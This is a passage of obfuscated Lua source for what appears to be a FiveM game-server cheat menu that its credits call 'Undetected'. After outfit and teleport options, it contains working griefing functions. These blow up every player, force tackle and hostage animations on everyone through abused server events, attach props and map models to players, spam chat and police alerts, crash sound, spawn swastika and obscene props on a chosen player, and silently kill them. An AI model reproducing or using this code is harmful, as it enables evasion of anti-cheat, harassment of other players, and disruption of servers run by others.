				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 51, 6)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 14, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 5, 9)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 9, 5)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 23, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 7, 9)
			elseif pszycisk31eqd_PN('~g~SWAT') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 17, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 56, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 19, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 58, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL3', 4, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 55, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif pszycisk31eqd_PN('~g~Ghost') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 17, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 29, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 28, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 31, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 24, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL', 30, 2)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 50, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif pszycisk31eqd_PN('~g~Elf') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 34, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 4, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 19, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 22, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL1', 18, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 28, 8)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 19, 1)
			elseif pszycisk31eqd_PN('~g~Thug') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 46, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 17, 6)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 51, 7)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 22, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 7, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 44, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 12, 6)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 14, 7)
			elseif pszycisk31eqd_PN('~g~Santa Claus') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 8, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 12, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 19, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 4, 4)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL1', 10, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 21, 2)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 19, 0)
			elseif pszycisk31eqd_PN('~g~Penguin') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 31, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HAIR', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 32, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 17, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL1', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 57, 0)
				--[[ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL3', 0, 0)]]
				ChangeAppearance_PN_ASUHGIUDSHGSD('TEXTURES', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 51, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 0, 0)
			elseif pszycisk31eqd_PN('~g~Soldier') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 96, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 54, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 0, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL1', 0, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 15, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 53, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 51, 0)
			elseif pszycisk31eqd_PN('~g~Soldier 2') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 40, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('MASK', 28, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO', 44, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('LEGS', 34, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('HANDS', 45, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SHOES', 25, 0)
				ChangeAppearance_PN_ASUHGIUDSHGSD('SPECIAL2', 56, 1)
				ChangeAppearance_PN_ASUHGIUDSHGSD('TORSO2', 53, 0)
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Supermoce_31da_PN') then
			if checkbox_PN_31DA_PN(
				"Make you flare",
				MakeYouFlare_PN_UDYUFGDUYFGIDFGF,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					MakeYouFlare_PN_UDYUFGDUYFGIDFGF = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
		elseif checkbox_PN_31DA_PN(
			"Become a flash",
			Becoome_A_Flesz_131DA_PN,
			function(Wlaczone_PN_MENU_E1QDA_XD)
				Becoome_A_Flesz_131DA_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
			then
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Credists_PE1_PN') then
		if menibutton_PN938D_PN("Menu Credits", 'CreditsyMenu_31da_PN') then
		elseif pszycisk31eqd_PN("~p~[ E D I T ] ~s~ Papuszkin", "~r~[ E D I T ]") then
		powiadomienia31qda_PN("~h~~p~[ E D I T ] ~g~ Undetected menu")
		end
		
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('CreditsyMenu_31da_PN') then
		if pszycisk31eqd_PN("~o~War Menu ~w~- ~b~https://github.com/warxander/warmenu") then
		end

			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('MenuTeleportacji413eqda_PN') then
		if pszycisk31eqd_PN('~g~SAFE > ~s~ Teleport to ~b~Waypoint!', "~p~[ FUNCTION ]") then
			teleporttocooooords_PN()
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Waypoint to coords", "~g~[ LEGIT ]") then
		local koordy31da512_x_PN = klawiaturainput419r8q_PN("X", "", 100)
		local koordy31da512_y_PN = klawiaturainput419r8q_PN("Y", "", 100)
		sritizen_INVOKE_PN(0xFE43368D2AA4F2FC, IntToFloat_NUGTHBGNURTHNHTR(tonumber(koordy31da512_x_PN)), IntToFloat_NUGTHBGNURTHNHTR(tonumber(koordy31da512_y_PN)))
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Teleport to ~b~coords", "~p~[ FUNCTION ]") then
			teleportstocooords_PN()
		elseif pszycisk31eqd_PN('~g~SAFE > ~s~ Teleport to ~b~Waypoint!', "~p~[ FUNCTION ]") then
			teleporttocooooords_PN()
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Teleport To ~g~Weed Farm", "Native") then
			sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), 1066.009, -3183.386, -39.164)
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Teleport To ~b~Meth Farm", "Native") then
			sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), 998.629, -3199.545, -36.394)
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Teleport To ~r~Coke Farm", "Native") then
			sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), 1088.636, -3188.551, -38.993)
		elseif pszycisk31eqd_PN("~g~SAFE > ~s~ Teleport To ~y~Money Wash", "Native") then
			sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), 1118.405, -3193.687, -40.394)
		end
		
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Rozwalaczserwera_31qda_PN') then
		--[[elseif pszycisk31eqd_PN("~r~DANGEROUS  > ~s~ Nuker") then
		for b_duhgsdiofgijosdf=0, 256 do
			PN_WAIT_31DA31_PN(20)
			for sinksianksionk=0, 50 do
				PN_WAIT_31DA31_PN(1)
				local coordsdfgkjdhgliodfigdfg = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, b_duhgsdiofgijosdf))
				local autko31da_31eq_PN = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Marquis")
				local autko31da_31eq_PN_2 = sritizen_INVOKE_PN(0xD24D37CC275948CC, "Tanker")
				sritizen_INVOKE_PN(0x963D27A58DF860AC, autko31da_31eq_PN)
				while not sritizen_INVOKE_PN(0x98A4EB5D89A0C952, autko31da_31eq_PN) do
					PN_WAIT_31DA31_PN(0)
				end
				sritizen_INVOKE_PN(0x963D27A58DF860AC, autko31da_31eq_PN_2)
				while not sritizen_INVOKE_PN(0x98A4EB5D89A0C952, autko31da_31eq_PN_2) do
					PN_WAIT_31DA31_PN(0)
				end
				local vehdgdfiugidfgdfgfghdfhfdgh = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, b_duhgsdiofgijosdf)), true, true)
				local vehdgdfiugidfgdfgfghdfhfdgh_2 = sritizen_INVOKE_PN(0xAF35D0D2583051B0, autko31da_31eq_PN_2, coordsdfgkjdhgliodfigdfg.x, coordsdfgkjdhgliodfigdfg.y, coordsdfgkjdhgliodfigdfg.z+5, sritizen_INVOKE_PN(0xE83D4F9BA2A38914, sritizen_INVOKE_PN(0x43A66C31C68491C0, b_duhgsdiofgijosdf)), true, true)
				end
			end]]
		if pszycisk31eqd_PN("~r~DANGEROUS  > ~s~ Explode everyone") then
			for i_duhfsdfigsdfg = 0, #GetActivePlayers_PN_UDGYUDFIGKDFGDF() do
				sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, i_duhfsdfigsdfg)), 8, 100000.0, true, false, 0.0)
			end
			 elseif pszycisk31eqd_PN("~r~DANGEROUS  > ~s~ Tackle everyone") then
						local cOSSSSSSSS = "anim@gangops@hostage@"
                    local HEHRHJTRJRTJR = "perp_idle"
                    local chujchujchuj = "anim@gangops@hostage@"
                    local lolbekadupa = "victim_idle"
                    for ANTEKSUCKDICK, i_DSDSGUSHDIUGSD in ipairs(GetActivePlayers_PN_UDGYUDFIGKDFGDF()) do
                        TriggerServerEvent(
                            "esx_kekke_tackle:tryTackle",
                            sritizen_INVOKE_PN(0x43A66C31C68491C0, -1),
                            cOSSSSSSSS,
                            chujchujchuj,
                            HEHRHJTRJRTJR,
                            lolbekadupa,
                            0.11,
                            -0.24,
                            0.0,
                            GetPlayerServerId_PN_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD),
                            100000,
                            0.0,
                            49,
                            49,
                            50,
                            true
                        )
                        PN_WAIT_31DA31_PN(1000)
                    end
		elseif pszycisk31eqd_PN('~r~DANGEROUS > ~s~ Spawn All Props On Everyone', 'Native') then
		for b_djguisernglse = 0, 128 do
		PN_WAIT_31DA31_PN(100)
				for sinksianksionk=1, #props_IDHSOGLFDSKGDUHIOSSD do
					PN_WAIT_31DA31_PN(5)
			local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[sinksianksionk]), 0, 0, 0, true, true, true)
								sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
								propsydropsy31_PN,
									sritizen_INVOKE_PN(0x43A66C31C68491C0, b_djguisernglse),
									sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, b_djguisernglse), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
						end
					end
					elseif pszycisk31eqd_PN("~r~DANGEROUS > ~s~ Hostage everyone") then
						local cOSSSSSSSS = "anim@gangops@hostage@"
                    local HEHRHJTRJRTJR = "perp_idle"
                    local chujchujchuj = "anim@gangops@hostage@"
                    local lolbekadupa = "victim_idle"
                    for ANTEKSUCKDICK, i_DSDSGUSHDIUGSD in ipairs(GetActivePlayers_PN_UDGYUDFIGKDFGDF()) do
                        TriggerServerEvent(
                            "cmg3_animations:sync",
                            sritizen_INVOKE_PN(0x43A66C31C68491C0, -1),
                            cOSSSSSSSS,
                            chujchujchuj,
                            HEHRHJTRJRTJR,
                            lolbekadupa,
                            0.11,
                            -0.24,
                            0.0,
                            GetPlayerServerId_PN_DUHGIUSHGUFD(i_DSDSGUSHDIUGSD),
                            100000,
                            0.0,
                            49,
                            49,
                            50,
                            true
                        )
                        PN_WAIT_31DA31_PN(1000)
					end
					
					
			 elseif pszycisk31eqd_PN("~r~DANGEROUS > ~s~ Community Service") then
			 CommunityService_1_PN()
			  elseif pszycisk31eqd_PN("~r~DANGEROUS > ~s~ Interact Sound Crasher", "~o~[ EARRAPE ]") then
			 earrape1459515q_PN()
			   elseif pszycisk31eqd_PN("~r~DANGEROUS > ~s~ Police Alert Spam") then
			 polisaj019u8_PN()
				elseif checkbox_PN_31DA_PN(
				"~r~DANGEROUS  > ~s~ Chat Spammer",
				HTYJKUKYUKYUKUKY,
				function(Wlaczone_PN_MENU_E1QDA_XD)
				HTYJKUKYUKYUKUKY = Wlaczone_PN_MENU_E1QDA_XD
				end)
				then
				elseif checkbox_PN_31DA_PN(
				"~r~DANGEROUS  > ~s~ Explode Everyone Loop",
				explodeall91507q_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
				explodeall91507q_PN = Wlaczone_PN_MENU_E1QDA_XD
				end)
				then
		       end

			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Onlajnplejers31qda_PN') then
			for sinksianksionk = 0, 128 do
				if sritizen_INVOKE_PN(0xB8DFD30D6973E135, sinksianksionk) and sritizen_INVOKE_PN(0x4D97BCC7, sinksianksionk) ~= 0 and menibutton_PN938D_PN(GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(sinksianksionk).." [ID: "..sritizen_INVOKE_PN(0x4D97BCC7, sinksianksionk)..(sritizen_INVOKE_PN(0x3317DEDB88C95038, sritizen_INVOKE_PN(0x43A66C31C68491C0, sinksianksionk), 1) and "] ~r~ [DEAD]"or "] ~g~[ALIVE]"), 'TrollMenuWOnlajnsach_PN') then
					zaznaczonygracz31_PN = sinksianksionk
				end
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Trolloweopcjead_PN') then
			if pszycisk31eqd_PN("Taze ~g~Player") then
				STEJZUJFRAJERA31DA_PN(zaznaczonygracz31_PN)
			elseif pszycisk31eqd_PN("Molotov ~g~Player") then
				sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 3, 100000.0, true, false, 0)
			elseif checkbox_PN_31DA_PN(
				"Molotov ~g~Player Loop",
				molotofcfela31qd_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					molotofcfela31qd_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
				elseif pszycisk31eqd_PN("Swastika ~g~Player") then
			    spawnowaniesfastiki31_PN(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 2.0)
				elseif pszycisk31eqd_PN("Dick ~g~Player") then
				DICKWTWOJEJMORDZIE31DA_PN(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 2.0)
				elseif checkbox_PN_31DA_PN(
				"Shake Camera ~g~Player Loop",
				TWERKUJKAMERAGRACZA13QDA_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					TWERKUJKAMERAGRACZA13QDA_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
					elseif pszycisk31eqd_PN("Hydrant ~g~Player") then
					local coords31dqa_PN = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
					sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, coords31dqa_PN.x, coords31dqa_PN.y, coords31dqa_PN.z-1, 13, 100000.0, true, false, 0.0)
				elseif checkbox_PN_31DA_PN(
				"Hydrant ~g~Player",
				Hydrantnatypkasrypka31_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					Hydrantnatypkasrypka31_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
					elseif pszycisk31eqd_PN("Flare ~g~Player") then
					sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 22, 100000.0, true, false, 0.0)
				elseif checkbox_PN_31DA_PN(
				"Flare ~g~Player",
				Flarka31da_DA_PN,
				function(Wlaczone_PN_MENU_E1QDA_XD)
					Flarka31da_DA_PN = Wlaczone_PN_MENU_E1QDA_XD
					end)
				then
				elseif pszycisk31eqd_PN("Gas ~g~Player") then
				sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 21, 100000.0, true, false, 0.0)
				elseif pszycisk31eqd_PN("Fire ~g~Player") then
				sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 12, 100000.0, true, false, 0.0)
				elseif pszycisk31eqd_PN('Silent Kill ~g~Player') then
            	sritizen_INVOKE_PN(0x6B76DC1F3AE6E6A3, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 0)
			end
		
		displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('OpcjeTeleportowOnline31qd_PN') then
		if menibutton_PN938D_PN("Maps", "MapyzakladkawPropachTrollOnline_PN") then
		elseif menibutton_PN938D_PN("Flags", "Flagipropsowe31q_PN") then
		elseif pszycisk31eqd_PN('Spawn All Props', 'Native') then
				for sinksianksionk=1, #props_IDHSOGLFDSKGDUHIOSSD do
					PN_WAIT_31DA31_PN(5)
			local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[sinksianksionk]), 0, 0, 0, true, true, true)
								sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
								propsydropsy31_PN,
									sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
									sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
						end
					end
								
			for JSAGFUISHFUDS, DUGISUGDSHGISD in pairs(props_one_DSUHGIUDSGSDG) do
				if pszycisk31eqd_PN(""..JSAGFUISHFUDS, "Native") then
			local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, DUGISUGDSHGISD), 0, 0, 0, true, true, true)
								sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
								propsydropsy31_PN,
									sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
									sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
				end
			end	
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Flagipropsowe31q_PN') then
			for JSAGFUISHFUDS, DUGISUGDSHGISD in pairs(flags_DHDSIUHGIUSDHGSD) do
				if pszycisk31eqd_PN(""..JSAGFUISHFUDS, "Native") then
			local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, DUGISUGDSHGISD), 0, 0, 0, true, true, true)
								sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
								propsydropsy31_PN,
									sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
									sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
									0.4,
									0,
									0,
									0,
									270.0,
									60.0,
									true,
									true,
									false,
									true,
									1,
									true
								)
				end
			end	
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('MapyzakladkawPropachTrollOnline_PN') then
		if pszycisk31eqd_PN('Mount Chilliad', "Native") then
				local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, 'cs1_lod3_terrain_slod3_01'), 0, 0, 0, true, true, true)
				local prop_2_dsugusiddfsg = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, 'cs1_lod3_terrain_slod3_06'), 0, 0, 0, true, true, true)
				sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
				propsydropsy31_PN,
					sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
					sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
					0.4,
					0,
					0,
					0,
					270.0,
					60.0,
					true,
					true,
					false,
					true,
					1,
					true
				)
				sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
				prop_2_dsugusiddfsg,
					sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
					sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
					0.4,
					0,
					0,
					0,
					270.0,
					60.0,
					true,
					true,
					false,
					true,
					1,
					true
				)
				elseif pszycisk31eqd_PN("Airport", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "ap1_lod_slod4"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Los Santos City", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_lod_f1_slod3"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Sandy Shores", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "cs4_lod_01_slod3"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("Paleto Bay", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "cs1_lod2_01_7_slod3"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("All Map", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_21_reflproxy"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
                                    0,
                                    0,
                                    270.0,
                                    60.0,
                                    true,
                                    true,
                                    false,
                                    true,
                                    1,
                                    true
                                )
								
								elseif pszycisk31eqd_PN("FBI", "Native") then
				 local propsydropsy31_PN = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "dt1_props_combo0110_slod"), 0, 0, 0, true, true, true)
                                sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, 
                                propsydropsy31_PN,
                                    sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN),
                                    sritizen_INVOKE_PN(0x3F428D08BE5AAE31, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), 57005),
                                    0.4,
                                    0,
